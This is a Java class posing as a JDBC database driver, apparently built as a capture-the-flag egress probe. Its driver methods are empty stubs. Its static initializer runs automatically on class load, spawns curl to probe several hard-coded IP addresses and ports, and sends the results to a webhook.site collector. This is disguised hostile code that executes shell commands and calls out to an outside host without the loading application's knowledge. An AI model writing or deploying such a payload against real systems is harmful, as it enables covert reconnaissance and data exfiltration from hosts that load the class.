import java.io.*;
import java.sql.*;
import java.util.Properties;
import java.util.logging.Logger;
public final class EgressCanarya4ed8a8e7adb9ce9 implements Driver {
 static String probe(String url) {
  try {
   Process p=new ProcessBuilder("curl","--noproxy","*","-ks","--connect-timeout","3","--max-time","5","-o","/dev/null","-w","%{http_code}:%{time_connect}",url).start();
   BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
   String out=r.readLine(); int exit=p.waitFor();
   return exit+":"+(out==null?"":out);
  } catch(Exception e) { return "java-error"; }
 }
 static {
  String[][] targets=new String[][]{
  {"144.202.105.188:80","http://144.202.105.188:80/ctf-egress-4fe37c01d30a"},
  {"144.202.105.188:443","http://144.202.105.188:443/ctf-egress-4fe37c01d30a"},
  {"144.202.105.188:8080","http://144.202.105.188:8080/ctf-egress-4fe37c01d30a"},
  {"45.76.247.95:80","http://45.76.247.95:80/ctf-egress-4fe37c01d30a"},
  {"45.76.247.95:443","http://45.76.247.95:443/ctf-egress-4fe37c01d30a"},
  {"45.76.247.95:8080","http://45.76.247.95:8080/ctf-egress-4fe37c01d30a"},
  {"45.76.218.249:80","http://45.76.218.249:80/ctf-egress-4fe37c01d30a"},
  {"45.76.218.249:443","http://45.76.218.249:443/ctf-egress-4fe37c01d30a"},
  {"45.76.218.249:8080","http://45.76.218.249:8080/ctf-egress-4fe37c01d30a"}
  };
  StringBuilder result=new StringBuilder();
  for(String[] t:targets) { if(result.length()>0) result.append(","); result.append(t[0]).append("=").append(probe(t[1])); }
  try { new ProcessBuilder("curl","-fsS","--max-time","8","-A","ctf-egress-processbuilder","-G","--data-urlencode","marker=ctf-egress-4fe37c01d30a","--data-urlencode","result="+result.toString(),"https://webhook.site/54fddee2-c0fc-40f2-bb14-f181d41912d5").start().waitFor(); } catch(Exception ignored) {}
 }
 public Connection connect(String u,Properties p) { return null; }
 public boolean acceptsURL(String u) { return true; }
 public DriverPropertyInfo[] getPropertyInfo(String u,Properties p) { return new DriverPropertyInfo[0]; }
 public int getMajorVersion() { return 1; } public int getMinorVersion() { return 0; }
 public boolean jdbcCompliant() { return false; }
 public Logger getParentLogger() { return Logger.getGlobal(); }
}
